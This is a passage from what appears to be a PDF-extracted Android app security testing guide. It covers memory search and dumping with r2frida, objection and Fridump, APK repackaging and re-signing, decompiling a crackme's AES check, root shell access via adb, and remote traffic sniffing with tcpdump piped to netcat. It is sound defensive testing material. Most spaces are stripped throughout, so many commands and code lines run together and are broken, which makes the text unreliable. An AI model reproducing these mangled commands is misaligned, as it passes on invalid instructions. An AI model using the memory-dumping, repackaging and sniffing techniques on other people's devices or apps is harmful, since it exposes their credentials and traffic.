-0x000000009b371000rw-/dev/ashmem/dalvik-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art (deleted) 0x0000007d103be000 -0x0000007d10686000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.vdex 0x0000007d10dd0000 -0x0000007d10dee000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10dee000 -0x0000007d10e2b000r-x/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10e3a000 -0x0000007d10e3b000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d10e3b000 -0x0000007d10e3c000rw-/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex 0x0000007d1c499000 -0x0000007d1c49a000r-x/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4a9000 -0x0000007d1c4aa000r--/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4aa000 -0x0000007d1c4ab000rw-/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c516000 -0x0000007d1c54d000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007dbd23c000 -0x0000007dbd247000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007dc05db000 -0x0000007dc05dc000r--/data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.art Whileyou’researchingorexploringtheappmemory,youcanalwaysverifywhereyou’relocatedateachmoment(where yourcurrentoffsetislocated)inthememorymap. Insteadofnotingandsearchingforthememoryaddressinthislist youcansimplyrun\dm.. You’llfindanexampleinthefollowingsection“In-MemorySearch”. Ifyou’reonlyinterestedinthemodules(binariesandlibraries)thattheapphasloaded,youcanusethecommand\il tolistthemall: [0x00000000]>\il 0x000000558b1fd000app_process64 0x0000007dbc859000libandroid_runtime.so 0x0000007dbf5d7000libbinder.so 0x0000007dbff4d000libcutils.so 0x0000007dbfd13000libhwbinder.so 0x0000007dbea00000liblog.so 0x0000007dbcf17000libnativeloader.so 0x0000007dbf21c000libutils.so 0x0000007dbde4b000libc++.so 0x0000007dbe09b000libc.so ... 0x0000007d10dd0000base.odex 0x0000007d1c499000libnative-lib.so 0x0000007d2354e000frida-agent-64.so 0x0000007dc065d000linux-vdso.so.1 0x0000007dc065f000linker64 Asyoumightexpectyoucancorrelatetheaddressesofthelibrarieswiththememorymaps: e.g.thenativelibraryofthe appislocatedat0x0000007d1c499000andoptimizeddex(base.odex)at0x0000007d10dd0000. Youcanalsouseobjectiontodisplaythesameinformation. $objection --gadget sg.vantagepoint.helloworldjniexplore sg.vantagepoint.helloworldjnion (google:8.1.0)[usb] #memorylistmodules Savetheoutputbyadding `--jsonmodules.json`tothiscommand Name Base Size Path ----------------------------------------------- ------------ -------------------- -------------------------------------------------------------------- app_process64 0x558b1fd000 32768 (32.0KiB) /system/bin/app_process64 libandroid_runtime.so 0x7dbc859000 1982464 (1.9MiB) /system/lib64/libandroid_runtime.so libbinder.so 0x7dbf5d7000 557056 (544.0KiB) /system/lib64/libbinder.so libcutils.so 0x7dbff4d000 77824 (76.0KiB) /system/lib64/libcutils.so libhwbinder.so 0x7dbfd13000 163840 (160.0KiB) /system/lib64/libhwbinder.so base.odex 0x7d10dd0000 442368 (432.0KiB) /data/app/sg.vantagepoint.helloworldjni-1/oat/arm64/base.odex libnative-lib.so 0x7d1c499000 73728 (72.0KiB) /data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so YoucanevendirectlyseethesizeandthepathtothatbinaryintheAndroidfilesystem. 160\nIn-Memory Search In-memorysearchisaveryusefultechniquetotestforsensitivedatathatmightbepresentintheappmemory. See r2frida’s help on the search command (\/?) to learn about the search command and get a list of options. The followingshowsonlyasubsetofthem: [0x00000000]>\/? / search /j searchjson /w searchwide /wj searchwidejson /x searchhex /xj searchhexjson ... Youcanadjustyoursearchbyusingthesearchsettings\e~search. Forexample,\e search.quiet=true;willprintonly theresultsandhidesearchprogress: [0x00000000]>\e~search esearch.in=perm:r-- esearch.quiet=false Fornow,we’llcontinuewiththedefaultsandconcentrateonstringsearch. Thisappisactuallyverysimple,itloadsthe string“HellofromC++”fromitsnativelibraryanddisplaysittous. Youcanstartbysearchingfor“Hello”andseewhat r2fridafinds: [0x00000000]>\/Hello Searching5bytes:48656c6c6f ... hits:11 0x13125398hit0_0HelloWorldJNI 0x13126b90hit0_1HelloWorld! 0x1312e220hit0_2HellofromC++ 0x70654ec5hit0_3Hello 0x7d1c499560hit0_4HellofromC++ 0x7d1c4a9560hit0_5HellofromC++ 0x7d1c51cef9hit0_6HelloWorldJNI 0x7d30ba11bchit0_7HelloWorld! 0x7d39cd796bhit0_8Hello.java 0x7d39d2024dhit0_9Hello; 0x7d3aa4d274hit0_10Hello Nowyou’dliketoknowwheretheseaddressesactuallyare. Youmaydosobyrunningthe\dm. commandforall@@hits matchingtheglobhit0_*: [0x00000000]>\dm.@@hit0_* 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x00000000703c2000 -0x00000000709b5000rw-/data/dalvik-cache/arm64/system@framework@boot-framework.art 0x0000007d1c499000 -0x0000007d1c49a000r-x/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c4a9000 -0x0000007d1c4aa000r--/data/app/sg.vantagepoint.helloworldjni-1/lib/arm64/libnative-lib.so 0x0000007d1c516000 -0x0000007d1c54d000r--/data/app/sg.vantagepoint.helloworldjni-1/base.apk 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d396bc000 -0x0000007d3a998000r--/system/framework/arm64/boot-framework.vdex 0x0000007d396bc000 -0x0000007d3a998000r--/system/framework/arm64/boot-framework.vdex 0x0000007d3a998000 -0x0000007d3aa9c000r--/system/framework/arm64/boot-ext.vdex Additionally, you can search for occurrences of the wide version of the string (\/w) and, again, check their memory regions: [0x00000000]>\/wHello Searching10bytes:480065006c006c006f00 hits:6 0x13102acchit1_0480065006c006c006f00 0x13102b9chit1_1480065006c006c006f00 0x7d30a53aa0hit1_2480065006c006c006f00 0x7d30a872b0hit1_3480065006c006c006f00 0x7d30bb9568hit1_4480065006c006c006f00 0x7d30bb9a68hit1_5480065006c006c006f00 [0x00000000]>\dm.@@hit1_* 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000000013100000 -0x0000000013140000rw-/dev/ashmem/dalvik-mainspace (regionspace)(deleted) 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 0x0000007d30a00000 -0x0000007d30c00000rw- 161\nTheyareinthesamerw-regionasoneofthepreviousstrings(0x0000007d30a00000). Notethatsearchingforthewide versionsofstringsissometimestheonlywaytofindthemasyou’llseeinthefollowingsection. In-memorysearchcan be very useful to quickly know ifcertain data is located in the main app binary, inside a shared libraryorinanotherregion. Youmayalsouseittotestthebehavioroftheappregardinghowthedataiskeptinmemory. Forinstance,youcouldanalyzeanappthatperformsaloginandsearchforoccurrencesoftheuserpassword. Also,you maycheckifyoustillcanfindthepasswordinmemoryaftertheloginiscompletedtoverifyifthissensitivedataiswiped frommemoryafteritsuse. Memory Dump Youcandumptheapp’sprocessmemorywithobjectionandFridump. Totakeadvantageofthesetoolsonanon-rooted device,theAndroidappmustberepackagedwithfrida-gadget.soandre-signed. Adetailedexplanationofthisprocess isinthesectionDynamicAnalysisonNon-RootedDevices. Tousethesetoolsonarootedphone,simplyhavefrida-server installedandrunning. Note: Whenusingthesetools,youmightgetseveralmemoryaccessviolationerrorswhichcannormallybeignored. ThesetoolsinjectaFridaagentandtrytodumpallthemappedmemoryoftheappregardlessoftheaccesspermis- sions(read/write/execute). Therefore,whentheinjectedFridaagenttriestoreadaregionthat’snotreadable,it’ll returnthecorrespondingmemoryaccessviolationerrors. Refertoprevioussection“MemoryMapsandInspection” formoredetails. Withobjectionitispossibletodumpallmemoryoftherunningprocessonthedevicebyusingthecommandmemorydump all. $objection --gadget sg.vantagepoint.helloworldjniexplore sg.vantagepoint.helloworldjnion (google:8.1.0)[usb] #memorydumpall/Users/foo/memory_Android/memory Willdump719rw-images,totalling1.6GiB Dumping1002.8MiBfrombase:0x14140000 [------------------------------------] 0% 00:11:03(sessiondetach message)process-terminated Dumping8.0MiBfrombase:0x7fc753e000 [####################################] 100% Memorydumpedtofile:/Users/foo/memory_Android/memory Inthiscasetherewasanerror,whichisprobablyduetomemoryaccessviolationsaswealreadyanticipated. This error can be safely ignored as long as we areable to see the extracted dump in the file system. If you have any problems,afirststepwouldbetoenablethedebugflag-dwhenrunningobjectionor,ifthatdoesn’thelp,filean issueinobjection’sGitHub. Next,weareabletofindthe“HellofromC++”stringswithradare2: $r2/Users/foo/memory_Android/memory [0x00000000]>izz~Hellofrom 11360x000652700x00065270 14 15 ()asciiHellofromC++ AlternativelyyoucanuseFridump. Thistime, wewillinputastringandseeifwecanfinditinthememorydump. For this, opentheMASTGHackingPlaygroundapp, navigateto“OMTG_DATAST_002_LOGGING”andenter“owasp-mstg”to thepasswordfield. Next,runFridump: python3fridump.py -Usg.vp.owasp_mobile.omtg_android -s CurrentDirectory:/Users/foo/git/fridump Outputdirectoryissetto:/Users/foo/git/fridump/dump StartingMemorydump... Oops,memoryaccessviolation!-------------------------------]0.28%Complete Progress: [##################################################]99.58%Complete Runningstringsonallfiles: Progress: [##################################################]100.0%Complete Finished! Tip: Enableverbositybyincludingtheflag-vifyouwanttoseemoredetails,e.g.theregionsprovokingmemory accessviolations. 162\nIt will take a while until it’s completed and you’ll get a collection of *.data files inside the dump folder. When you add the-sflag,allstringsareextractedfromthedumpedrawmemoryfilesandaddedtothefilestrings.txt,whichisalso storedinthedumpdirectory. lsdump/ dump/1007943680_dump.datadump/357826560_dump.data dump/630456320_dump.data...strings.txt Finally,searchfortheinputstringinthedumpdirectory: $grep -nri owasp-mstgdump/ Binaryfiledump//316669952_dump.datamatches Binaryfiledump//strings.txtmatches The“owasp-mstg”stringcanbefoundinoneofthedumpfilesaswellasintheprocessedstringsfile. Repackaging & Re-Signing Platform: android Repackaging Youcaneasilyrepackageanappbydoingthefollowing: cdUnCrackable-Level1 apktoolb zipalign -v4dist/UnCrackable-Level1.apk../UnCrackable-Repackaged.apk Note that the Android Studio build tools directory must be in the path. It is located at [SDK-Path]/build-tools/[ version]. Thezipalignandapksignertoolsareinthisdirectory. Re-Signing Beforere-signing, youfirstneedacode-signingcertificate. IfyouhavebuiltaprojectinAndroidStudiobefore,theIDE hasalreadycreatedadebugkeystoreandcertificatein$HOME/.android/debug.keystore. Thedefaultpasswordforthis KeyStoreis“android”andthekeyiscalled“androiddebugkey”. ThestandardJavadistributionincludeskeytoolformanagingKeyStoresandcertificates. Youcancreateyourownsigning certificateandkey,thenaddittothedebugKeyStore: keytool -genkey -v-keystore ~/.android/debug.keystore -alias signkey -keyalg RSA-keysize 2048 -validity 20000 Afterthecertificateisavailable,youcanre-signtheAPKwithit. Besurethatapksignerisinthepathandthatyourunit fromthefolderwhereyourrepackagedAPKislocated. apksignersign --ks ~/.android/debug.keystore --ks-key-alias signkeyUnCrackable-Repackaged.apk Note: If you experience JRE compatibility issues with apksigner, you can use jarsigner instead. When you do this, zipalignmustbecalledaftersigning. jarsigner -verbose -keystore ~/.android/debug.keystore../UnCrackable-Repackaged.apksignkey zipalign -v4dist/UnCrackable-Level1.apk../UnCrackable-Repackaged.apk Nowyoumayreinstalltheapp: 163\nadbinstallUnCrackable-Repackaged.apk Reviewing Decompiled Java Code Platform: android Followingtheexamplefrom“DecompilingJavaCode”,weassumethatyou’vesuccessfullydecompiledandopenedthe UnCrackableAppforAndroidLevel1inIntelliJ.AssoonasIntelliJhasindexedthecode,youcanbrowseitjustlikeyou’d browseanyotherJavaproject. Notethatmanyofthedecompiledpackages,classes,andmethodshaveweirdone-letter names;thisisbecausethebytecodehasbeen“minified”withProGuardatbuildtime. Thisisabasictypeofobfuscation thatmakesthebytecodealittlemoredifficulttoread,butwithafairlysimpleapplikethisone,itwon’tcauseyoumuch ofaheadache. Whenyou’reanalyzingamorecomplexapp,however,itcangetquiteannoying. When analyzing obfuscated code, annotating class names, method names, and other identifiers as you go along is a good practice. Open the MainActivity class in the package sg.vantagepoint.uncrackable1. The method verify is calledwhenyoutapthe“verify”button. Thismethodpassestheuserinputtoastaticmethodcalleda.a,whichreturns abooleanvalue. Itseemsplausiblethata.averifiesuserinput,sowe’llrefactorthecodetoreflectthis. Right-clicktheclassname(thefirstaina.a)andselectRefactor->Renamefromthedrop-downmenu(orpressShift-F6). Changetheclassnametosomethingthatmakesmoresensegivenwhatyouknowabouttheclasssofar. Forexample, youcouldcallit“Validator”(youcanalways revisethenamelater). a.anowbecomesValidator.a. Followthesame proceduretorenamethestaticmethodatocheck_input. Congratulations,youjustlearnedthefundamentalsofstaticanalysis! Itisallabouttheorizing,annotating,andgradually revisingtheoriesabouttheanalyzedprogramuntilyouunderstanditcompletelyor, atleast, wellenoughforwhatever youwanttoachieve. Next,Ctrl+click(orCommand+clickonMac)onthecheck_inputmethod. Thistakesyoutothemethoddefinition. The decompiledmethodlookslikethis: public static boolean check_input(Stringstring){ byte[]arrby =Base64.decode((String)\ "5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=",(int)0); byte[]arrby2 =newbyte[]{}; try{ arrby =sg.vantagepoint.a.a.a(Validator.b("8d127684cbc37c17616d806cf50473cc"),arrby); arrby2 =arrby; 164\n}sa catch (Exceptionexception){ Log.d((String)"CodeCheck",(String)("AESerror:" +exception.getMessage())); } if(string.equals(newString(arrby2))){ return true; } return false; } So,youhaveaBase64-encodedStringthat’spassedtothefunctionainthepackage sg.vantagepoint.a.a (again, everything is called a) along with something that looks suspiciously like a hex-encoded encryptionkey(16hexbytes=128bit,acommonkeylength). Whatexactlydoesthisparticularado? Ctrl-clickittofind out. public class a{ public static byte[]a(byte[]object,byte[]arrby){ object =newSecretKeySpec((byte[])object,"AES/ECB/PKCS7Padding"); Ciphercipher =Cipher.getInstance("AES"); cipher.init(2,(Key)object); return cipher.doFinal(arrby); } } Nowyou’regettingsomewhere: it’ssimplystandardAES-ECB.LooksliketheBase64stringstoredinarrby1incheck_- inputisaciphertext. Itisdecryptedwith128bitAES,thencomparedwiththeuserinput. Asabonustask,trytodecrypt theextractedciphertextandfindthesecretvalue! A faster way to get the decrypted string is to add dynamic analysis. We’ll revisit UnCrackable App for Android Level 1 latertoshowhow(e.g.intheDebuggingsection),sodon’tdeletetheprojectyet! Get Open Connections Platform: android Youcanfindsystem-widenetworkinginformationin/proc/netorjustbyinspectingthe/proc/<pid>/netdirectories(for somereasonnotprocessspecific). Therearemultiplefilespresentinthesedirectories,ofwhichtcp,tcp6andudpmight beconsideredrelevantfromthetester’sperspective. ##cat/proc/7254/net/tcp sl local_addressrem_address sttx_queuerx_queuetrtm->whenretrnsmt uid timeoutinode ... 69:1101A8C0:BB2F9A447D4A:01BB0100000000:0000000000:000000000000000010093 075412 100000000000000002031910 -1 70:1101A8C0:917CE3CB3AD8:01BB0100000000:0000000000:000000000000000010093 075553 100000000000000002032310 -1 71:1101A8C0:C1E39C187D4A:01BB0100000000:0000000000:000000000000000010093 075458 100000000000000002031910 -1 ... Intheoutputabove,themostrelevantfieldsforusare: • rem_address: remoteaddressandportnumberpair(inhexadecimalrepresentation). • tx_queue and rx_queue: the outgoing and incoming data queue in terms of kernel memory usage. These fields giveanindicationhowactivelytheconnectionisbeingused. • uid: containingtheeffectiveUIDofthecreatorofthesocket. Anotheralternativeistousethenetstatcommand,whichalsoprovidesinformationaboutthenetworkactivityforthe complete system in a more readable format, and can be easily filtered as per our requirements. For instance, we can easilyfilteritbyPID: ##netstat-p|grep24685 ActiveInternetconnections (w/oservers) ProtoRecv-QSend-QLocalAddress ForeignAddress State PID/ProgramName tcp 0 0192.168.1.17:47368 172.217.194.103:https CLOSE_WAIT 24685/com.google.android.youtube tcp 0 0192.168.1.17:47233 172.217.194.94:https CLOSE_WAIT 24685/com.google.android.youtube tcp 0 0192.168.1.17:38480 sc-in-f100.1e100.:httpsESTABLISHED24685/com.google.android.youtube tcp 0 0192.168.1.17:44833 74.125.24.91:https ESTABLISHED24685/com.google.android.youtube tcp 0 0192.168.1.17:38481 sc-in-f100.1e100.:httpsESTABLISHED24685/com.google.android.youtube ... 165\nnetstatoutputisclearlymoreuserfriendlythanreading/proc/<pid>/net. Themostrelevantfieldsforus, similarto thepreviousoutput,arefollowing: • Foreign Address: remoteaddressandportnumberpair(portnumbercanbereplacedwiththewell-knownname ofaprotocolassociatedwiththeport). • Recv-QandSend-Q:Statisticsrelatedtoreceiveandsendqueue. Givesanindicationonhowactivelytheconnection isbeingused. • State: thestateofasocket,forexample,ifthesocketisinactiveuse(ESTABLISHED)orclosed(CLOSED). Get Loaded Native Libraries Platform: android Using Process Memory Maps Thefile/proc/<pid>/mapscontainsthecurrentlymappedmemoryregionsandtheiraccesspermissions. Usingthisfile wecangetthelistofthelibrariesloadedintheprocess. ##cat/proc/9568/maps 12c00000-52c00000rw-p0000000000:0414917 /dev/ashmem/dalvik-mainspace (regionspace)(deleted) 6f019000-6f2c0000rw-p00000000fd:001146914 /data/dalvik-cache/arm64/system@framework@boot.art ... 7327670000-7329747000r--p00000000fd:001884627 /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jkIMQ==/oat/arm64/base.odex .. 733494d000-7334cfb000r-xp00000000fd:001884542 ↪ /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so ... Using Frida You can retrieve process related information straight from the Frida CLI by using the Process command. Within the ProcesscommandthefunctionenumerateModulesliststhelibrariesloadedintotheprocessmemory. [HuaweiNexus6P::sg.vantagepoint.helloworldjni]->Process.enumerateModules() [ { "base":"0x558a442000", "name": "app_process64", "path":"/system/bin/app_process64", "size":32768 }, { "base":"0x78bc984000", "name":"libandroid_runtime.so", "path":"/system/lib64/libandroid_runtime.so", "size":2011136 }, ... Accessing the Device Shell Platform: android Oneofthemostcommonthingsyoudowhentestinganappisaccessingthedeviceshell. Inthissectionwe’llseehow toaccesstheAndroidshellbothremotelyfromyourhostcomputerwith/withoutaUSBcableandlocallyfromthedevice itself. Remote Shell InordertoconnecttotheshellofanAndroiddevicefromyourhostcomputer,adbisusuallyyourtoolofchoice(unless youprefertouseremoteSSHaccess,e.g.viaTermux). 166\nFor this section we assume that you’ve properly enabled Developer Mode and USB debugging as explained in “Testing on a Real Device”. Once you’ve connected your Android device via USB, you can access the remote device’s shell by running: adbshell pressControl+Dortypeexittoquit Onceintheremoteshell,ifyourdeviceisrootedoryou’reusingtheemulator,youcangetrootaccessbyrunningsu: bullhead:/$su bullhead:/ #id uid=0(root)gid=0(root)groups=0(root)context=u:r:su:s0 Onlyifyou’reworkingwithanemulatoryoumayalternativelyrestartadbwithrootpermissionswiththecommand adb root so next time you enter adb shell you’ll have root access already. This also allows to transfer data bidirectionallybetweenyourhostcomputerandtheAndroidfilesystem,evenwithaccesstolocationswhereonly therootuserhasaccessto(viaadbpush/pull). Seemoreaboutdatatransferinsection“Host-DeviceDataTransfer” below. Connect to Multiple Devices If you have more than one device, remember to include the -s flag followed by the device serial ID on all your adb commands(e.g.adb -s emulator-5554 shelloradb -s 00b604081540b7c6 shell). Youcangetalistofallconnected devicesandtheirserialIDsbyusingthefollowingcommand: adbdevices Listofdevicesattached 00c907098530a82c device emulator-5554 device Connect to a Device over Wi-Fi You can also access your Android device without using the USB cable. For this you’ll have to connect both your host computerandyourAndroiddevicetothesameWi-Finetworkandfollowthenextsteps: • ConnectthedevicetothehostcomputerwithaUSBcableandsetthetargetdevicetolistenforaTCP/IPconnection onport5555: adb tcpip 5555. • Disconnect the USB cable from the target device and run adb connect <device_ip_address>. Check that the deviceisnowavailablebyrunningadb devices. • Opentheshellwithadb shell. However,noticethatbydoingthisyouleaveyourdeviceopentoanyonebeinginthesamenetworkandknowingtheIP addressofyourdevice. YoumayratherpreferusingtheUSBconnection. Forexample,onaNexusdevice,youcanfindtheIPaddressatSettings->System->Aboutphone->Status ->IPaddressorbygoingtotheWi-Fimenuandtappingonceonthenetworkyou’reconnectedto. SeethefullinstructionsandconsiderationsintheAndroidDevelopersDocumentation. Connect to a Device via SSH Ifyouprefer,youcanalsoenableSSHaccess. AconvenientoptionistouseTermux,whichyoucaneasilyconfigureto offerSSHaccess(withpasswordorpublickeyauthentication)andstartitwiththecommandsshd(startsbydefaulton port 8022). In order to connect to the Termux via SSH you can simply run the command ssh -p 8022 <ip_address> (whereip_addressistheactualremotedeviceIP).Thisoptionhassomeadditionalbenefitsasitallowstoaccessthefile systemviaSFTPalsoonport8022. 167\nOn-device Shell App Whileusuallyusinganon-deviceshell(terminalemulator)suchasTermuxmightbeverytediouscomparedtoaremote shell,itcanprovehandyfordebuggingincaseof,forexample,networkissuesortochecksomeconfiguration. Basic Network Monitoring/Sniffing Platform: android Remotely sniffing all Android traffic in real-time is possible with tcpdump, netcat (nc), and Wireshark. First, make sure thatyouhavethelatestversionofAndroidtcpdumponyourphone. Herearetheinstallationsteps: adbroot adbremount adbpush/wherever/you/put/tcpdump/system/xbin/tcpdump Ifexecutionofadbrootreturnstheerroradbdcannotrunasrootinproductionbuilds,installtcpdumpasfollows: adbpush/wherever/you/put/tcpdump/data/local/tmp/tcpdump adbshell su mount -orw,remount/system; cp/data/local/tmp/tcpdump/system/xbin/ cd/system/xbin chmod 755tcpdump Incertainproductionbuilds,youmightencounteranerrormount: '/system' not in /proc/mounts. Inthatcase,youcanreplacetheaboveline$mount-orw,remount/system;with$mount-orw,remount/,asdescribed inthisStackOverflowpost. Remember: Tousetcpdump,youneedrootprivilegesonthephone! Executetcpdumponcetoseeifitworks. Onceafewpacketshavecomein,youcanstoptcpdumpbypressingCTRL+c. $tcpdump tcpdump:verboseoutputsuppressed,use -vor-vvforfullprotocoldecode listeningonwlan0,link-typeEN10MB (Ethernet),capturesize262144bytes 04:54:06.59075100:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply 04:54:09.65965800:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply 04:54:10.57979500:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply ^C 3packetscaptured 3packetsreceivedbyfilter 0packetsdroppedbykernel ToremotelysnifftheAndroidphone’snetworktraffic,firstexecutetcpdumpandpipeitsoutputtonetcat(nc): tcpdump -iwlan0 -s0-w-|nc-l-p11111 Thetcpdumpcommandaboveinvolves • listeningonthewlan0interface, • definingthesize(snapshotlength)ofthecaptureinbytestogeteverything(-s0),and • writingtoafile(-w). Insteadofafilename,wepass-,whichwillmaketcpdumpwritetostdout. Byusingthepipe(|),wesentalloutputfromtcpdumptonetcat,whichopensalisteneronport11111. You’llusuallywant tomonitorthewlan0interface. Ifyouneedanotherinterface,listtheavailableoptionswiththecommand$ ip addr. Toaccessport11111,youneedtoforwardtheporttoyourhostcomputerviaadb. 168\nadbforwardtcp:11111tcp:11111 ThefollowingcommandconnectsyoutotheforwardedportvianetcatandpipingtoWireshark. nclocalhost11111 |wireshark -k-S-i- Wiresharkshouldstartimmediately(-k). Itgetsalldatafromstdin(-i-)vianetcat,whichisconnectedtotheforwarded port. Youshouldseeallthephone’strafficfromthewlan0interface. Youcandisplaythecapturedtrafficinahuman-readableformatwithWireshark. Figureoutwhichprotocolsareusedand whethertheyareunencrypted. Capturingalltraffic(TCPandUDP)isimportant,soyoushouldexecuteallfunctionsofthe testedapplicationandanalyzeit. Thisneatlittletrickallowsyounowtoidentifywhatkindofprotocolsareusedandtowhichendpointstheappistalkingto. Thequestionsisnow,howcanItesttheendpointsifBurpisnotcapableofshowingthetraffic? Thereisnoeasyanswer forthis,butafewBurppluginsthatcangetyoustarted. Firebase/Google Cloud Messaging (FCM/GCM) FirebaseCloudMessaging(FCM),thesuccessortoGoogleCloudMessaging(GCM),isafreeserviceofferedbyGooglethat allowsyoutosendmessagesbetweenanapplicationserverandclientapps. Theserverandclientappcommunicatevia theFCM/GCMconnectionserver,whichhandlesdownstreamandupstreammessages. 169\nDownstreammessages(pushnotifications)aresentfromtheapplicationservertotheclientapp;upstreammessagesare sentfromtheclientapptotheserver. FCMisavailableforAndroid,iOS,andChrome. FCMcurrentlyprovidestwoconnectionserverprotocols: HTTPandXMPP.As describedintheofficialdocumentation,theseprotocolsareimplementeddifferently. Thefollowingexampledemonstrates howtointerceptbothprotocols. Preparation of Test Setup Youneedtoeitherconfigureiptablesonyourphoneorusebettercaptobeabletointercepttraffic. FCMcanuseeitherXMPPorHTTPtocommunicatewiththeGooglebackend. HTTP FCMusestheports5228,5229,and5230forHTTPcommunication. Usually,onlyport5228isused. • ConfigurelocalportforwardingfortheportsusedbyFCM.ThefollowingexampleappliestomacOS: $echo " rdrpassinetprototcpfromanytoanyport5228->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5229->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5230->127.0.0.1port8080 "|sudo pfctl -ef- • Theinterceptionproxymustlistentotheportspecifiedintheportforwardingruleabove(port8080). XMPP ForXMPPcommunication,FCMusesports5235(Production)and5236(Testing). • ConfigurelocalportforwardingfortheportsusedbyFCM.ThefollowingexampleappliestomacOS: $echo " rdrpassinetprototcpfromanytoanyport5235->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5236->127.0.0.1port8080 "|sudo pfctl -ef- Intercepting the Requests Theinterceptionproxymustlistentotheportspecifiedintheportforwardingruleabove(port8080). StarttheappandtriggerafunctionthatusesFCM.YoushouldseeHTTPmessagesinyourinterceptionproxy. 170\nEnd-to-End Encryption for Push Notifications Asanadditionallayerofsecurity,pushnotificationscanbeencryptedbyusingCapillary. Capillaryisalibrarytosimplify thesendingofend-to-end(E2E)encryptedpushmessagesfromJava-basedapplicationserverstoAndroidclients. Reviewing Disassembled Native Code Platform: android Followingtheexamplefrom“DisassemblingNativeCode”wewillusedifferentdisassemblerstoreviewthedisassembled nativecode. radare2 Onceyou’veopenedyourfileinradare2youshouldfirstgettheaddressofthefunctionyou’relookingfor. Youcandothis bylistingorgettinginformationiaboutthesymbolss(is)andgrepping(~radare2’sbuilt-ingrep)forsomekeyword,in ourcasewe’relookingforJNIrelatedsymbolssoweenter“Java”: $r2 -AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so ... [0x00000e3c]>is~Java 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Themethodcanbefoundataddress0x00000e78. Todisplayitsdisassemblysimplyrunthefollowingcommands: [0x00000e3c]>eemu.str=true; [0x00000e3c]>s0x00000e78 [0x00000e78]>af [0x00000e78]>pdf ╭(fcn)sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI12 │ sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_targ1); │ ;argint32_targ1@r0 │ 0x00000e78 ~ 0268 ldrr2, [r0] ;arg1 │ ;--aav.0x00000e79: │ ;UNKNOWNXREFfromaav.0x00000189 (+0x3) │ 0x00000e79 unaligned │ 0x00000e7a 0249 ldrr1,aav.0x00000f3c ;[0xe84:4]=0xf3caav.0x00000f3c │ 0x00000e7c d2f89c22 ldr.wr2,[r2,0x29c] │ 0x00000e80 7944 addr1,pc ;"HellofromC++" section..rodata ╰ 0x00000e82 1047 bxr2 Let’sexplainthepreviouscommands: 171\n• eemu.str=true;enablesradare2’sstringemulation. Thankstothis,wecanseethestringwe’relookingfor(“Hello fromC++”). • s 0x00000e78isaseektotheaddresss 0x00000e78,whereourtargetfunctionislocated. Wedothissothatthe followingcommandsapplytothisaddress. • pdfmeansprintdisassemblyoffunction. Usingradare2youcanquicklyruncommandsandexitbyusingtheflags-qc '<commands>'. Fromthepreviousstepswe knowalreadywhattodosowewillsimplyputeverythingtogether: $r2 -qc'eemu.str=true;s0x00000e78;af;pdf' HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so ╭(fcn)sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI12 │ sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_targ1); │ ;argint32_targ1@r0 │ 0x00000e78 0268 ldrr2, [r0] ;arg1 │ 0x00000e7a 0249 ldrr1, [0x00000e84] ;[0xe84:4]=0xf3c │ 0x00000e7c d2f89c22 ldr.wr2,[r2,0x29c] │ 0x00000e80 7944 addr1,pc ;"HellofromC++" section..rodata ╰ 0x00000e82 1047 bxr2 Noticethatinthiscasewe’renotstartingwiththe-Aflagnotrunningaaa. Instead,wejusttellradare2toanalyzethat onefunctionbyusingtheanalyzefunctionafcommand. Thisisoneofthosecaseswherewecanspeedupourworkflow becauseyou’refocusingonsomespecificpartofanapp. Theworkflowcanbefurtherimprovedbyusingr2ghidra,adeepintegrationofGhidradecompilerforradare2. r2ghidra generatesdecompiledCcode,whichcanaidinquicklyanalyzingthebinary. IDA Pro Weassumethatyou’vesuccessfullyopenedlib/armeabi-v7a/libnative-lib.soinIDApro. Oncethefileisloaded,click intothe“Functions”windowontheleftandpressAlt+ttoopenthesearchdialog. Enter“java”andhitenter. Thisshould highlight the Java_sg_vantagepoint_helloworld_ MainActivity_stringFromJNI function. Double-click the 